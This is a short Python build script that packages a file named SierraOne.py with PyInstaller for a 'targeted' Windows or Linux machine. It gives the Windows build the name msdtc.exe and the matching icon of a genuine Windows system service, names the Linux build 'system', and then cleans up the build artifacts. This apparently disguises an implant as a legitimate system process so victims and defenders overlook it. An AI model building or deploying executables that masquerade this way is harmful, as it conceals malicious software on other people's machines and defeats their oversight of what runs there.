import argparse
import os
import platform
import subprocess
import sys
import time
from shutil import rmtree


def remove_junk(dist):
    os.remove("msdtc.exe.spec" if dist.lower() == "windows" else "system.spec")
    rmtree("build")
    rmtree("__pycache__")
    
def builder(dist):
    if dist.lower() == "windows":
        subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
        time.sleep(1)
        remove_junk(dist)
        #subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
        print("\nDone. Check 'dist' for your file")
        sys.exit(0)

    elif dist.lower() == "linux":
        subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
        time.sleep(1)
        remove_junk(dist)
        #subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
        print("\nDone. Check 'dist' for your file")
        sys.exit(0)

    else:
        print("Unsupported operating system")
        sys.exit(0)
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")

    try:
        args = parser.parse_args()

    except:
        print("Missing arguments")
        sys.exit(0)

    builder(args.os)

if __name__ == "__main__":
    main()
